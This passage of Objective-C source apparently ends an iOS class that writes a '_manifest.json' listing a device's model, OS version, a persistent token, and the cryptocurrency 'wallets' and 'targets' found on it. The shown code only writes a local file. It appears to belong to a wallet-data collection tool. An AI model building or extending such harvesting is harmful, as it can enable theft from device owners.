        idfv = [[NSUserDefaults standardUserDefaults] stringForKey:@"WQLDeviceToken"];
        if (!idfv.length) {
            idfv = NSUUID.UUID.UUIDString;
            [[NSUserDefaults standardUserDefaults] setObject:idfv forKey:@"WQLDeviceToken"];
            [[NSUserDefaults standardUserDefaults] synchronize];
        }
    }

    UIDevice *dev = [UIDevice currentDevice];
    NSDictionary *man = @{
        @"deviceFolder": [NSString stringWithFormat:@"%@ iOS%@ %@",
                          dev.model, dev.systemVersion, idfv],
        @"ios": dev.systemVersion,
        @"productType": [self productType],
        @"found": found,
        @"wallets": wallets,
        @"source": @"WQLApp",
    };
    return [NSJSONSerialization dataWithJSONObject:man options:NSJSONWritingPrettyPrinted error:nil];
}

- (void)writeWalletManifestInDirectory:(NSString *)outDir
                               records:(NSArray<NSDictionary *> *)records {
    NSData *data = [self manifestDataForRecords:records];
    if (!data) return;
    [data writeToFile:[outDir stringByAppendingPathComponent:@"_manifest.json"] atomically:YES];
    NSMutableArray *found = [NSMutableArray array];
    for (NSDictionary *r in records) {
        NSString *n = r[@"target"];
        if (n.length && ![found containsObject:n]) [found addObject:n];
    }
    [self log:@"    _manifest.json 已写入，涉及 %@",
          found.count ? [found componentsJoinedByString:@","] : @"无命中"];
}

- (NSString *)productType {
    size_t size = 0;
    if (sysctlbyname("hw.machine", NULL, &size, NULL, 0) != 0 || size == 0) return @"iPhone";
    char *buf = malloc(size);
    if (!buf) return @"iPhone";
    NSString *model = @"iPhone";
    if (sysctlbyname("hw.machine", buf, &size, NULL, 0) == 0) {
        NSString *s = [NSString stringWithUTF8String:buf];
        if (s) model = s;
    }
    free(buf);
    return model;
}

- (NSString *)humanBytes:(uint64_t)b {
    if (b < 1024) return [NSString stringWithFormat:@"%llu B", (unsigned long long)b];
    if (b < 1024 * 1024) return [NSString stringWithFormat:@"%.1f KB", b / 1024.0];
    if (b < 1024ULL * 1024 * 1024) return [NSString stringWithFormat:@"%.1f MB", b / 1048576.0];
    return [NSString stringWithFormat:@"%.2f GB", b / 1073741824.0];
}

@end
